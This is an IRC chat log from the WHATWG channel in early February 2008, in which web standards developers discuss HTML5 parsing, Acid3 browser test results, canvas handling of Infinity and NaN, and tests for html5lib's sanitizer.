2008-02-01
[16:38:00.0000] <zcorpan_>
http-equiv=page-enter is a hack to make ie not flash when navigating between pages

[16:43:00.0000] <Dashiva>
Good times

[17:12:00.0000] <zcorpan_>
http://eric.van-der-vlist.com/blog/2008/01/31/html-5-turns-documents-into-applications/

[17:12:01.0000] <zcorpan_>
/me is confused

[17:16:00.0000] <marcosc_>
"While many people agree that web applications should be designed as documents, HTML 5 appears to propose to move from documents to applications. This seems to me to be a major step… backward!" :)

[17:16:01.0000] <Hixie>
gotta love the members of the xml crowd who are now desperately trying to back track away from xml requiring fatal handling of errors

[17:17:00.0000] <Hixie>
(the spec is pretty damn clear about it, it's not easy to argue out of it)

[17:18:00.0000] <marcosc_>
"no, by fatal we meant kill a kitten, not stop processing the document" :P

[17:19:00.0000] <Hixie>
so i don't really understand what that article is saying, other than apologising for xml, except maybe that html5 should not define interop as much as it does

[17:19:01.0000] <Hixie>
in which case my response to that feedback would have to be "Thanks but no thanks".

[17:19:02.0000] <Ketsuban>
But Hixie, I like having my weblog break every time some jackass posts a comment and forgets to close his <p> tag. :D

[17:22:00.0000] <Philip`>
marcosc_: That's not quite sufficient error handling - you'd have to add an OUT_OF_KITTENS_ERR exception to cope with all contingencies

[17:22:01.0000] <marcosc_>
hehe

[17:23:00.0000] <Philip`>
Ketsuban: You don't want weblog commenters to add <script>s to your page, so you've got to pass comments through an HTML parser anyway, and then you can whitelist and reserialise with correctly closed tags

[17:24:00.0000] <Ketsuban>
True.

[17:24:01.0000] <Ketsuban>
The headache only comes when your comment parser starts spitting out invalid code. =P

[17:25:00.0000] <Philip`>
Nobody cares about invalid code as long as it's well-formed

[17:25:01.0000] <Philip`>
and well-formedness is less impossible to get right

[17:25:02.0000] <Philip`>
(though evidence suggests nobody gets it right anyway)

[17:26:00.0000] <Philip`>
(but they just need better tools that output proper XML for them, and then it'll all be fine)

[17:35:00.0000] <marcosc_>
"The HTML Working Group doesn’t expect that HTML 5 becomes a recommendation before Q3 20010 and before that date everything can happen." We have 18,000 years to build the spec! 

[17:40:00.0000] <Philip`>
If two interoperable implementations of a spec have been released, but they have been lost for thousands of years and are known only in legends, does that still let you go to REC?

[17:40:01.0000] <Hixie>
no, you need to be able to demonstrate interoperability

[17:41:00.0000] <Philip`>
You could have a copy of the test report that was printed out by an earlier civilisation

[17:41:01.0000] <Hixie>
no, _you_ need to be able to demonstrate interoperability

[17:41:02.0000] <Hixie>
(as in the working group)

[17:41:03.0000] <Hixie>
a test report is not such a demonstration

[18:20:00.0000] <Dashiva>
So we need to contiuously demonstrate interoperability to maintain REC status? Like, daily?

[18:41:00.0000] <Hixie>
Dashiva: nah, once you're in REC you're done

[18:42:00.0000] <Dashiva>
What about if you publish an update, like HTML 4.01?

[18:42:01.0000] <Hixie>
depends if it changes something normative or not

[18:44:00.0000] <Dashiva>
But would you need to demonstrate interop for the entire spec, or just the delta?

[18:46:00.0000] <Hixie>
the spec

[18:53:00.0000] <Philip`>
/me wonders how many successful SIGCOMM submissions have been missing entire sections and pages on the day before the deadline

[19:40:00.0000] <Hixie>
blimey, firefox is way too eager to put <script> elements in the <head>

[19:41:00.0000] <jruderman>
https://bugzilla.mozilla.org/show_bug.cgi?id=402537 ?

[19:42:00.0000] <Hixie>
yeah. it's in acid3 even.

[19:43:00.0000] <jruderman>
hah, nice

[19:43:01.0000] <SadEagle>
ah. That might explain some difficulties I had w/my testcase in ff

[19:43:02.0000] <Hixie>
basically they will put <script>s in the <head> unless they've seen some non-whitespace text

[19:43:03.0000] <Hixie>
and they'll execute the script before the other elements are added to the tree

[19:44:00.0000] <Hixie>
it's crazy stuff

[19:44:01.0000] <Hixie>
gecko so needs to have its parser ripped out and replaced by an html5 parser

[19:45:00.0000] <SadEagle>
I think I got in habbit of having all my testcases run scripts from onload and not inline since getElementById("foo")  would mysteriously not work.

[19:46:00.0000] <SadEagle>
Of course, I should shut up, since khtml's parser doesn't do so hot on acid3

[19:46:01.0000] <Hixie>
hehe

[19:47:00.0000] <Hixie>
is it very different from webkit's?

[19:47:01.0000] <SadEagle>
not sure, same codebase, but details matter here. It does some pretty egreggious things. In particular, it finds the iframes tasty. 

[19:47:02.0000] <Hixie>
k

[19:47:03.0000] <Hixie>
i know webkit had to change stuff in the parser as part of their acid3 fixes

[19:48:00.0000] <SadEagle>
With that fixed, it somehow eats the 'fail' child of the iframe, which is absolutely mysterious, seeing how the internal DTD allows it (unlike iframe-under-map)

[19:48:01.0000] <SadEagle>
hmm, may be I should debug that now.

[19:48:02.0000] <Hixie>
yeah, webkit does that too

[19:49:00.0000] <Hixie>
i recommend writing an html5 parser implementation from scratch, and using it in webkit and khtml :-)

[19:49:01.0000] <SadEagle>
I suspect both would behave pretty similarly with the DTD relaxed sufficiently.

[19:50:00.0000] <SadEagle>
And, to be honest, the parser is -mostly- fine. The tokenizer, OTOH, is a crime against humanity

[19:50:01.0000] <Hixie>
well the tokeniser part of html5 is even easier to implement than the parser

[19:51:00.0000] <Hixie>
and is relatively separate

[19:51:01.0000] <SadEagle>
do you expect it to have a chance at the stuff in the wild?

[19:52:00.0000] <Hixie>
yes

[19:52:01.0000] <Hixie>
it's what i use to run over google's index, and it's what html5lib implements, and what henri uses in his validator

[19:52:02.0000] <Hixie>
amongst other things

[19:53:00.0000] <Hixie>
there are open issues (see http://whatwg.org/issues and search for "tokeniser")

[19:53:01.0000] <marcosc_>
the acid3 reference rendering does not look as it should on my ipod? hixie, is that correct? 

[19:53:02.0000] <Hixie>
but they are relatively minor

[19:53:03.0000] <Hixie>
marcosc_: checking...

[19:53:04.0000] <SadEagle>
I guess the most important thing is quick recovery. though messing up a </script> boundary could be trouble..

[19:54:00.0000] <Philip`>
http://canvex.lazyilluminati.com/misc/parser/tokeniser.html lets you play with a non-document.write-supporting version of the HTML5 tokeniser

[19:54:01.0000] <Hixie>
wow, my ipod only gets 27/100. not the worst rendering i've seen, though.

[19:54:02.0000] <Hixie>
oh no

[19:54:03.0000] <Hixie>
40/100

[19:54:04.0000] <Hixie>
it's just slow around the two perf tests

[19:54:05.0000] <jruderman>
ipod touch with webkit?

[19:55:00.0000] <Hixie>
jruderman: yes

[19:55:01.0000] <marcosc_>
yeah, not too bad :)

[19:55:02.0000] <Hixie>
marcosc_: looks fine to me, except the text goes out of the box

[19:55:03.0000] <SadEagle>
Philip`: may be I should be a good boy and pull up some of those nasty testcases :-)

[19:55:04.0000] <jruderman>
maybe you should make it indicate when it's doing the perf test

[19:55:05.0000] <jruderman>
(or pull the perf test from acid3)

[19:55:06.0000] <marcosc_>
hixie, I was wondering if the text going out was ok. So that's ok then. 

[19:55:07.0000] <Hixie>
marcosc_: but that's caused by the wacky font zooming "feature"

[19:55:08.0000] <Hixie>
marcosc_: well, it's not "ok" per se

[19:56:00.0000] <Hixie>
marcosc_: but it's intentional on their part

[19:56:01.0000] <Hixie>
it looks like it's basically a minimum font size

[19:56:02.0000] <marcosc_>
Hixie, thanks for the clarification. 

[19:57:00.0000] <Hixie>
(they couldn't claim to pass like this, but they don't claim to pass acid2, either)

[19:58:00.0000] <jruderman>
do you consider having a minimum font size by default to be a spec violation?

[20:02:00.0000] <Hixie>
http://damowmow.com/playground/demos/font-size/a.html suggests it's not actually as simple as it being a minimum font size thing

[20:03:00.0000] <Hixie>
jruderman: not really, but there are certain cases (like the way gecko lets the min font size pref override even the font size of elements with no text) that i think are wrong

[20:03:01.0000] <Hixie>
not sure how strongly the spec backs me up

[20:13:00.0000] <SadEagle>
Hixie: heh, I am pretty sure the text-under-iframe-eater is in the tokenizer. uh-oh.

[20:14:00.0000] <Hixie>
marcosc_: this is really weird behaviour. i don't understand why the text takes so much room on the ipod

[20:15:00.0000] <marcosc_>
Hixie, that's what I thought... which prompted me to ask ;) I thought maybe there was something wrong in the css or something.  

[20:15:01.0000] <Hixie>
that text is definitely bigger than 16px

[20:15:02.0000] <Hixie>
but i don't understand why

[20:17:00.0000] <marcosc_>
unfortunately, I can't do any testing atm because I don't have wireless here

[20:21:00.0000] <SadEagle>
(grmbl. it explicitly discards stuff within an iframe... Wonder why, it should hide content just fine)

[20:28:00.0000] <SadEagle>
yikes. going to the html5 spec with tokenizer on full debug is not fun

[20:31:00.0000] <Hixie>
hah

[20:31:01.0000] <SadEagle>
BTW, FF2.0 seems to parse everything inside <iframe> literaly. Well, at least the elements, anyway

[20:32:00.0000] <Hixie>
anyone here have a graphics package up who could throw me a data: URL to a 1x1 PNG of #000080 ?

[20:32:01.0000] <Hixie>
SadEagle: yeah, see the spec for what should happen

[20:32:02.0000] <Hixie>
html5 spec, that is

[20:33:00.0000] <SadEagle>
I see. That actually specs that. 

[20:33:01.0000] <SadEagle>
I have a webbrowser, one sec.

[20:37:00.0000] <Hixie>
nevermind

[20:37:01.0000] <Hixie>
got one

[20:37:02.0000] <Hixie>
yay for convert(1)

[20:38:00.0000] <Hixie>
convert -size 1x1 xc:transparent -fill '#008' -draw 'rectangle 0,0 1,1' blue.png

[20:39:00.0000] <SadEagle>
I did this: http://pastebin.ca/887193 -- before trying to get too cute

[20:39:01.0000] <Hixie>
hah

[20:39:02.0000] <Hixie>
yeah, i guess that would be another way!

[20:39:03.0000] <Hixie>
shoulda thought of that

[20:41:00.0000] <SadEagle>
well, test 4 fails on expectation 43 now. progress :-)

[20:41:01.0000] <Hixie>
looks like the iphone's "minimum font size" isn't a fixed size

[20:42:00.0000] <Hixie>
it's just a dampening, as the font size gets smaller, it bumps it up a bit

[20:44:00.0000] <Hixie>
and it only does it if the text is multiline

[20:46:00.0000] <Hixie>
http://www.hixie.ch/tests/adhoc/css/fonts/size/007.html is a minimised test case for the iPod acid3 reference image bug

[20:48:00.0000] <SadEagle>
uhm, hixie, in test 4, is the 2nd half supposed ot be all backwards-going?

[20:48:01.0000] <Hixie>
did i screw up?

[20:48:02.0000] <SadEagle>
'cause you got a couple of nextNode calls in there

[20:48:03.0000] <Hixie>
fixed

[20:48:04.0000] <SadEagle>
thanks

[20:49:00.0000] <SadEagle>
yey, 63!

[20:54:00.0000] <SadEagle>
Hixie: where is the stuff for test 70 loaded?

[20:54:01.0000] <Hixie>
around test 65

[20:55:00.0000] <SadEagle>
I see. a whee bit of cascade there.

[20:55:01.0000] <Hixie>
yeah. i tried to do it earlier to give browsers a chance to get it done in the 50ms i give them

[20:55:02.0000] <Hixie>
instead of requiring it to happen in 10ms

[20:56:00.0000] <Hixie>
(the resources for the test are all given cache ages of about a year, so everything should be cached if you're running the test the second time to get timings)

[20:56:01.0000] <Hixie>
(the final part of the test is getting the speed up, hence the timer at the end of the debug log. :-D )

[20:56:02.0000] <Hixie>
(acid3 has to be the most fucked up benchmark ever, but there ya go)

[20:57:00.0000] <SadEagle>
hmm, looks like fraime-onload being bad.

[20:58:00.0000] <SadEagle>
 I see you've never seen the 24fun "JavaScript" benchmark :-)

[20:59:00.0000] <Hixie>
it's worse? because that would surprise me :-)

[20:59:01.0000] <Hixie>
http://www.city-data.com/city/Hardy-Iowa.html uses <canvas> for its intended purpose. sweet.

[21:00:00.0000] <SadEagle>
Hixie: it's first benchmark tries to measure how fast an empty'ish for loop counter runs. It 'helpfully' displays its progress on the statusbar once every 100 iterations or so. You can guess what it's -really- measuring, right? :-)

[21:00:01.0000] <Hixie>
(nice, firefox's "view image" feature on a canvas shows you the data: URI)

[21:00:02.0000] <Hixie>
SadEagle: hahaha

[21:01:00.0000] <Hixie>
nice

[21:08:00.0000] <SadEagle>
ugh, cnn.com is using flash for content stuff.

[21:11:00.0000] <SadEagle>
anyway, good night

[01:17:00.0000] <hsivonen>
Surely Eric van der Vlist knows that fatal errors in XML were meant as "halt and catch fire"

[01:53:00.0000] <hsivonen>
http://www.jezuk.co.uk/arabica/log?id=3591 looks like we need to beat the drum about the existence of the HTML5 parsing algorithm more

[02:04:00.0000] <hsivonen>
the Frech Wikipedia says: "Il semblerai qu'en 2008 le XHTML 2.0 soit abandonné au profit du HTML 5"

[02:04:01.0000] <hsivonen>
French even

[02:06:00.0000] <Camaban>
well, it does seem that way....

[02:07:00.0000] <hsivonen>
Camaban: yes. my point is that the French wikitruthiness is more pro-HTML5 than the English wikitruthiness

[02:08:00.0000] <Camaban>
ah

[02:09:00.0000] <Philip`>
Are there any people who were working on XHTML2 and then abandoned it once HTML5 started? Or had they all decided to stay away years ago, when there was no sign of the W3C ever doing HTML5?

[04:37:00.0000] <hsivonen>
any suggestions for a UI name for the datatype that the content attribute takes when meta is in the content-type state?

[04:45:00.0000] <hsivonen>
"legacy character encoding declaration"?

[04:46:00.0000] <hsivonen>
Hixie: surely the meta charset should be ASCII-case-insensitive

[05:07:00.0000] <hsivonen>
why on earth are ' ` { and } allowed in MIME charset names?

[05:35:00.0000] <thomas______>
hey folk, anybody here who has some experience using crossfade effects using a canvas

[05:36:00.0000] <thomas______>
because i currently wrote a mootools effect for that but its not the fastest one 

[05:43:00.0000] <Dashiva>
http://www.ietf.org/rfc/rfc2397

[05:43:01.0000] <Dashiva>
Is it just me, or are they sending plain text as text/html?

[05:43:02.0000] <Philip`>
Dashiva: It's not just you

[05:44:00.0000] <hsivonen>
how the mighty have fallen

[05:44:01.0000] <Philip`>
For compatibility with web content, browsers will have to start sniffing plain text that is served as text/html

[05:44:02.0000] <Dashiva>
It's kinda bad when even the ietf gets it wrong :)

[05:47:00.0000] <Philip`>
http://www.ietf.org/mail-archive/web/ietf-announce/current/msg04511.html - sounds like this is an expected time for problems

[06:08:00.0000] <Dashiva>
annevk: around?

[06:23:00.0000] <hsivonen>
what's the right way to do case-insensitive attribute value matching in XPath? do I need to use translate?

[07:01:00.0000] <Lachy>
Hixie, is acid3 finished now?  I noticed that /003/NOT_READY_PLEASE_DO_NOT_USE.html is redirecting to /003/ now

[07:01:01.0000] <hsivonen>
hmm. I should probably make v.nu check the contents of well-known but obsolete container elements

[07:40:00.0000] <gsnedders>
Lachy: it's under review, per what he said yesterday

[07:43:00.0000] <Lachy>
gsnedders, ok. I wasn't paying attention yesterday

[08:00:00.0000] <hsivonen>
/me notes that neither MIT nor W3C are acronyms in the dictionary sense of the word even if marked up as <acronym> in the spec boilerplate

[08:02:00.0000] <gsnedders>
/me doesn't even ask the eternal question of, "what is an acronym anyway?"

[08:03:00.0000] <jgraham_>
/me choses not to read any mail mentioning <acronym> vs <abbr> (I think this is the only topic I skip entirely)

[08:09:00.0000] <didymos>
hsivonen, MIT isn't? How come?

[08:11:00.0000] <hsivonen>
didymos: it is pronounced em eye tee -- not mit

[08:11:01.0000] <didymos>
hsivonen, my Webster's lists radar and FBI as acronyms -- MIT seems to fall under the latter

[08:11:02.0000] <gsnedders>
hsivonen: oh, you've forgetting the issue that dictionaries don't agree on what an acronym is.

[08:12:00.0000] <gsnedders>
hsivonen: in some dictionaries MIT is, in others it isn't

[08:12:01.0000] <hsivonen>
didymos: Webster's is then closer to the actual usage than some other dictionaries

[08:12:02.0000] <gsnedders>
/me has OED compact. edition downstairs (i.e., the full OED in 3pt type)

[08:12:03.0000] <didymos>
hsivonen, But I see your point on W3C not being an acronym

[08:13:00.0000] <gsnedders>
apparently the second edition OED changed the type to being even smaller so it was just one volume.

[08:13:01.0000] <webben>
no

[08:13:02.0000] <webben>
still 2 volume

[08:14:00.0000] <webben>
(there might have been special editions of 2nd edn. in one vol though)

[08:14:01.0000] <hsivonen>
does the New Oxford American Dictionary have anything to do with the real OED?

[08:15:00.0000] <webben>
http://en.wikipedia.org/wiki/New_Oxford_American_Dictionary

[08:15:01.0000] <webben>
seems like a helpful guide to it

[08:15:02.0000] <webben>
(yes, something to do with it, seems the answer)

[08:15:03.0000] <gsnedders>
it was written from scratch, though

[08:15:04.0000] <webben>
/me wonders whether they reflect the Websters vs Oxford difference in acronym.

[08:16:00.0000] <hsivonen>
webben: thanks

[08:16:01.0000] <webben>
it's worth noting that OED does include American usages and spellings

[08:16:02.0000] <webben>
I'd imagine these things are based in sharing corpus to some degree

[08:17:00.0000] <gsnedders>
yeah, even if the text it different

[11:04:00.0000] <Hixie>
/me commented on http://eric.van-der-vlist.com/blog/2008/01/31/html-5-turns-documents-into-applications/ after al

[11:04:01.0000] <Hixie>
l

[11:39:00.0000] <annevk>
Hixie, http-equiv="Content-Language" does affect :lang() in some implementations

[11:39:01.0000] <annevk>
Hixie, we could of course revisit that as only testcases rely on it

[11:40:00.0000] <annevk>
maybe that would be better as its slightly less code and less weird cases to test and implement

[11:46:00.0000] <annevk>
Also, the new security policy is not good enough

[11:46:01.0000] <annevk>
Roundtripping of data: URIs is made impossible :(

[11:50:00.0000] <krijnh>
"The HTML Working Group doesn�t expect that HTML 5 becomes a recommendation before Q3 20010 and before that date everything can happen."

[11:53:00.0000] <gsnedders>
Philip`: yeah, I haven't done any revision for the prelims which just finished

[11:54:00.0000] <gsnedders>
krijnh: yeah, I noticed that. Issues of storing years as a single digit.

[11:58:00.0000] <jgraham_>
For what definition of the word "everything" does "everything" have a chance of happening in the next 18002 years?

[11:58:01.0000] <krijnh>
I think I'll have a beard by then

[12:55:00.0000] <gsnedders>
/me notes RFC4287 (The Atom Syndication Format) despite saying what elements are doesn't require (or even suggest) that the elements must be used and interpreted as meaning what it says they are

[13:15:00.0000] <Philip`>
Hmm, ten hours of reading and writing LaTeX makes my eyes hurt :-(

[13:34:00.0000] <Philip`>
Also, LaTeX's interpretation of /[A-Z]\. / as being a middle initial in a name and therefore deserving of less whitespace than a sentence ending was clearly not designed by someone thinking of the modern computing world of acronyms :-(

[13:35:00.0000] <Philip`>
...or abbreviations or initialisms or whatever they are today

[14:07:00.0000] <annevk>
Microsoft bid on Y? wow

[14:07:01.0000] <Dashiva>
I liked Ballmer's comment

[14:07:02.0000] <Dashiva>
>> "Today, the market is increasingly dominated by one player who is consolidating its dominance through acquisition," Ballmer wrote in the letter.

[15:04:00.0000] <webben>
Dashiva: Yes. The solution to monopolisation is a bigger monopoly. ;)

[15:07:00.0000] <webben>
krijnh: ironically a later date than can be expressed with TIME DATETIME= 

[15:34:00.0000] <Hixie>
i wonder how to require that UAs support infinity on canvas.

[15:35:00.0000] <Philip`>
Any Turing-complete computer should be able to handle infinitely large canvases just fine

[15:36:00.0000] <annevk>
by allowing them to clamp?

[15:37:00.0000] <Philip`>
annevk: What would ctx.rotate(Infinity) be clamped to?

[15:39:00.0000] <Hixie>
what should happen with that?

[15:40:00.0000] <annevk>
2π

[15:40:01.0000] <Hixie>
so no effect then?

[15:40:02.0000] <Hixie>
i guess i could say that

[15:40:03.0000] <annevk>
actually, i'll leave this up to whatever Philip` says

[15:41:00.0000] <Philip`>
I don't have any good ideas

[15:41:01.0000] <Hixie>
well i've made rotate(Infinity) be ignored, and all others be honoured

[15:41:02.0000] <Hixie>
not sure what to do with NaN

[15:41:03.0000] <annevk>
makes sense to ignore that too, no?

[15:42:00.0000] <annevk>
if we don't want to throw anymore

[15:42:01.0000] <Philip`>
rotate("45 anticlockwise")

[15:42:02.0000] <Philip`>
Maybe it'd help debugging if that threw an exception since it's NaN

[15:42:03.0000] <Hixie>
annevk: there's a mathematically correct solution for infinite coordinates and transformations (other than infinite rotations)

[15:43:00.0000] <Philip`>
but that seems a pretty unlikely situation

[15:43:01.0000] <Hixie>
Philip`: i'm more thinking about maths that ends up doing 0/0 or some such

[15:44:00.0000] <jgraham_>
NaNslipping into calculations silently has never helped me, so I'f favour an exception, but I don't think that's always right

[15:44:01.0000] <Philip`>
Only for some infinite coordinates - e.g. moveTo(-Infinity,-Infinity);lineTo(Infinity,Infinity);lineTo(-Infinity,Infinity);fill() has no mathematically correct solution

[15:45:00.0000] <Hixie>
wouldn't it be a single diagonal line?

[15:45:01.0000] <Hixie>
tl to br

[15:45:02.0000] <Hixie>
?

[15:46:00.0000] <Philip`>
What angle would the line be?

[15:47:00.0000] <Philip`>
and why wouldn't it be a different angle?

[15:48:00.0000] <Hixie>
pi/4, because otherwise the infinities would be different infinities? :-)

[15:48:01.0000] <Hixie>
(and crossin 0,0)

[15:49:00.0000] <Ketsuban>
Infinity could be defined as the screen edges. =P

[15:49:01.0000] <Hixie>
i could also just say that all infinities and NaNs cause rendering to stop for whatever the inf or NaN value touches

[15:49:02.0000] <Hixie>
basically, tell me what to do and i'll do it :-)

[15:50:00.0000] <Ketsuban>
So if the canvas covers the whole screen a line from (inf,inf) to (-inf,-inf) would be the top left corner to the bottom right corner. If the canvas is smaller then it captures that line bounded by the edges of the canvas.

[15:50:01.0000] <Philip`>
If you rotated that pi/4 line by a bit, it'd be a different line but it'd still be going from -inf to +inf on each axis, and unfortunately the IEEE people weren't considerate enough to allow lossless encoding of values like 2*Infinity :-(

[15:50:02.0000] <Hixie>
Philip`: sure, i was mostly being flippant

[15:51:00.0000] <Philip`>
Causing rendering to stop sounds about as fatal as throwing an exception, but without providing a nice message in the error log to help people debug it

[15:52:00.0000] <Hixie>
Philip`: ok, so what should i require?

[15:56:00.0000] <aseem>
Hi. I am trying to write some tests for some modification I made to the sanitizer to allow stripping of risky elements

[15:56:01.0000] <Philip`>
I suppose I can't see anything particularly wrong with just ignoring any function calls (or assignments etc) with +/- Infinity or NaN, and I guess it'd be reasonably easy to implement since it's just a test at the top of each function

[15:56:02.0000] <aseem>
I was looking at the tests1.dat file in the testdata folder and am unsure as to what the rexml field represents

[15:58:00.0000] <annevk>
sounds like something for ruby

[15:59:00.0000] <jgraham_>
aseem: which file exactly?

[15:59:01.0000] <annevk>
http://html5lib.googlecode.com/svn/trunk/testdata/sanitizer/tests1.dat

[15:59:02.0000] <annevk>
i suspect it's about Ruby's XML parser


2008-02-02
[16:00:00.0000] <Hixie>
Philip`: how's this?:

[16:00:01.0000] <Hixie>
  <p>Unless otherwise stated, any method call with a numeric argument

[16:00:02.0000] <Hixie>
  whose value is an infinite or NaN value must be ignored. Similarly,

[16:00:03.0000] <Hixie>
  any numeric property setter called with a value that is infinite or

[16:00:04.0000] <Hixie>
  a NaN value must be ignored.</p>

[16:00:05.0000] <Philip`>
Is that applying just to canvas, or the whole of HTML5?

[16:01:00.0000] <Hixie>
canvas

[16:01:01.0000] <Hixie>
2D context specifically

[16:02:00.0000] <Philip`>
I don't see anything objectionable there

[16:02:01.0000] <Hixie>
k

[16:02:02.0000] <jgraham_>
aseem: It is something ruby specific so, given Sam wrote those tests and he has offered to port your code to ruby I wouldn't worry too much about it :)

[16:03:00.0000] <Philip`>
(create{Linear,Radial}Gradient and isPointInPath and getImageData seem to be the places that would need some otherwise statements)

[16:03:01.0000] <Hixie>
=oh?

[16:04:00.0000] <Hixie>
why?

[16:04:01.0000] <Philip`>
Because they have to return something of the correct type

[16:04:02.0000] <Hixie>
oh right

[16:04:03.0000] <Philip`>
so they'd have to return null or false or whatever

[16:04:04.0000] <Philip`>
s/or whatever//

[16:05:00.0000] <annevk>
i can't find the toDataURL() + drawImage(data: ) issue in the issue tracker

[16:07:00.0000] <Philip`>
annevk: That was resolved ages ago since the spec said it was permitted

[16:07:01.0000] <Philip`>
(but maybe things have changed since then)

[16:08:00.0000] <annevk>
it did?

[16:09:00.0000] <Philip`>
http://lists.whatwg.org/htdig.cgi/whatwg-whatwg.org/2007-May/011308.html

[16:10:00.0000] <annevk>
i see, that's not what browsers do

[16:11:00.0000] <Philip`>
Browsers are bad and wrong :-)

[16:11:01.0000] <annevk>
and doesn't cover <img src=evil.com> that redirects to a data: URI

[16:11:02.0000] <annevk>
as far as I can tell

[16:11:03.0000] <annevk>
the origin section is pretty vague about what "image" means in this case too

[16:12:00.0000] <Hixie>
that presumably wouldn't be evil.com

[16:12:01.0000] <Hixie>
it would be victim.com

[16:13:00.0000] <aseem>
jgraham:  so I guess I will leave them empty. thanks

[16:14:00.0000] <annevk>
Hixie, i guess so, yeah

[16:14:01.0000] <jgraham_>
aseem: Are you copying the whole file?

[16:14:02.0000] <Hixie>
brb

[16:14:03.0000] <aseem>
jgraham: yes that was my intent, and then I was planning to remove anything that did not need to be there

[16:16:00.0000] <jgraham_>
Hmm. You might want to think about adding the stripped behavior as an extra field in the current file. That way we're less likely o get tests for the two parts out of sync

[16:18:00.0000] <aseem>
I did think abou that. The reason I thought about forking the data file and the test too is because there are in line tests in the test_sanitizer.py. I could of course modify the addtest method to also accept a stripped output param, but was hesitant to change that

[16:19:00.0000] <aseem>
mainly because the change would require quite a few more things to be added to SanitizeTest class

[16:20:00.0000] <aseem>
that is something I might need to do even if I added the extra field in the data file also

[16:24:00.0000] <Hixie>
right, checked in the changes

[16:24:01.0000] <Hixie>
for infinities

[16:24:02.0000] <Hixie>
this changes how transformations handle inf, btw

[16:24:03.0000] <jgraham_>
aseem: I suggest you make sanitize_html take a kwarg strip=False 

[16:25:00.0000] <jgraham_>
Then modify buildTestSuite to add the tests from the same data file but your new field being read for the expected value

[16:25:01.0000] <jgraham_>
Then modify all the inline tests to also have a strip=True version

[16:26:00.0000] <jgraham_>
(of course you need to actually implement strip=True in sanitize_html)

[16:26:01.0000] <jgraham_>
Does that make sense?

[16:26:02.0000] <aseem>
sure... that was the original plan, I just balked at the amount of change that would require :)

[16:27:00.0000] <aseem>
and chose to take the lazier route

[16:28:00.0000] <aseem>
also I think there might be a problem with the toxml method for tokens.

[16:28:01.0000] <jgraham_>
?

[16:28:02.0000] <aseem>
ie the original _base.Node.toxml accepts and encoding= param which none of the base class implementations do which may cause it to barf 

[16:28:03.0000] <Hixie>
so for createLinearyGradient i support we just sayt that the two points are subjected to the CTM and that's that

[16:28:04.0000] <Hixie>
but for createRadialGradient...

[16:29:00.0000] <aseem>
sorry I meant derived class implementations

[16:29:01.0000] <aseem>
We ran into that recently and I had to go back to the example that I had originally posted on the mailing list because there I can pass in an encoding parameter

[16:29:02.0000] <Hixie>
/me cheats his way out and moves on

[16:33:00.0000] <aseem>
oops! I misspoke, its the Document.toxml() that has the encoding parameter, which is not available for others Node derived classes 

[16:35:00.0000] <jgraham_>
That makes more sense :)

[16:35:01.0000] <jgraham_>
I'm not quite sure we want to be using .toxml() at all at this point; the proper serializer seems like a better option

[16:36:00.0000] <aseem>
In any case I will try out the original approach (the one you outlined) and get it to work, before tackling the encoding related issue

[16:36:01.0000] <aseem>
which is what is in the example that I posted in the mailing list :)

[16:37:00.0000] <jgraham_>
/me wonders if people are using toxml

[16:38:00.0000] <aseem>
the using html5lib wiki page provides the serializer oriented example, however the code in the test suite looks quite compact and attractive :)

[16:40:00.0000] <aseem>
one good thing about the toxml approach is that the element attribute ordering is not messed up in the output. I have not been able to figure out how to do that with the serializer (yet).

[17:16:00.0000] <Hixie>
how can Referer: possibly be relative

[17:16:01.0000] <Hixie>
i don't understand wha that would mean

[17:16:02.0000] <Hixie>
oh we can just make it "#PING"

[17:17:00.0000] <Hixie>
since that's non-conforming today

[17:25:00.0000] <Hixie>
bbl

[22:36:00.0000] <takkaria>
Prince really is pretty fantastic

[00:55:00.0000] <gsnedders>
/me is reminded by that to report a bug with his print styles in WebKit :P

[02:54:00.0000] <annevk>
Hixie, data:,ping

[02:58:00.0000] <gsnedders>
/me treats the above as application/octet+stream as it has no defined MIME type

[03:00:00.0000] <annevk>
that'd be a bug

[03:00:01.0000] <gsnedders>
/me needs http://bugs.gsnedders.com/

[03:02:00.0000] <hsivonen>
Lachy: there are articles pending review in the blog queue

[03:03:00.0000] <gsnedders>
hmm, if I declare a public entity, does it exist in a system entity?

[03:39:00.0000] <jgraham_>
hsivonen: I think all three of those articles are spam (I only deleted the English one)

[03:39:01.0000] <hsivonen>
jgraham_: ok

[03:51:00.0000] <Lachy>
the other two are spam as well.  I was just about to delete the english one too

[03:55:00.0000] <annevk>
should we transition the WHATWG blog to HTML 5?

[04:01:00.0000] <Lachy>
we could do that.

[04:02:00.0000] <Lachy>
we had done that once before

[04:04:00.0000] <Lachy>
actually, it could be good to develop an HTML5 WordPress template

[04:10:00.0000] <annevk>
yep

[06:16:00.0000] <gsnedders>
annevk: if you allow DOCTYPEs in XML5, can you _please_ allow parsed entities to have them

[07:00:00.0000] <annevk>
http://lists.w3.org/Archives/Public/public-html/2008Feb/0021.html

[07:00:01.0000] <annevk>
hmm

[07:03:00.0000] <Philip`>
The HTML-to-plain-text email conversion there is really broken

[07:04:00.0000] <annevk>
oh, that's how i see it too

[07:06:00.0000] <Philip`>
The plain-text <HYPERLINK "http://www.htmlhelp.com/reference/html40/tables/td.html"TD nowrap> is meant to be <TD nowrap> where the "TD" is a link

[07:08:00.0000] <Philip`>
(I don't know what validator it is that links to htmlhelp.com...)

[07:09:00.0000] <annevk>
http://htmlhelp.com/tools/validator/ ?

[07:09:01.0000] <Philip`>
Oh, could be

[12:11:00.0000] <Hixie>
people really should stop appealing to webarch to defend their arguments

[12:12:00.0000] <Hixie>
it's a little like referring to a religious text

[12:12:01.0000] <Hixie>
it only works when the other person is converted

[12:14:00.0000] <Dashiva>
So Hixie, did zcorpan mention the issue with acid3 test 48?

[12:17:00.0000] <Hixie>
i don't think so

[12:18:00.0000] <Hixie>
what's the problem?

[12:18:01.0000] <Philip`>
/me tries not to wonder what happens when you use arcTo to draw an infinitely long line while the CTM has a scale factor of zero

[12:18:02.0000] <Dashiva>
If the iframe onload to remove the class fails, the test will pass automatically

[12:18:03.0000] <Hixie>
Philip`: how can you draw an infinitely long line?

[12:19:00.0000] <Philip`>
Hixie: By using arcTo so that it draws a line to (x_{inf}, y_{inf})

[12:19:01.0000] <Hixie>
Philip`: calls to arcTo() with Infinity as an argument would get ignored per the latest tet

[12:19:02.0000] <Hixie>
Dashiva: hm

[12:20:00.0000] <Philip`>
Hixie: arcTo with finite arguments is explicitly defined to draw an infinite line in certain cases

[12:20:01.0000] <Hixie>
Philip`: oh

[12:20:02.0000] <Philip`>
Anyway, I'd be happiest to ignore it and have it implicitly undefined behaviour because it's not really going to matter for real-world interoperability

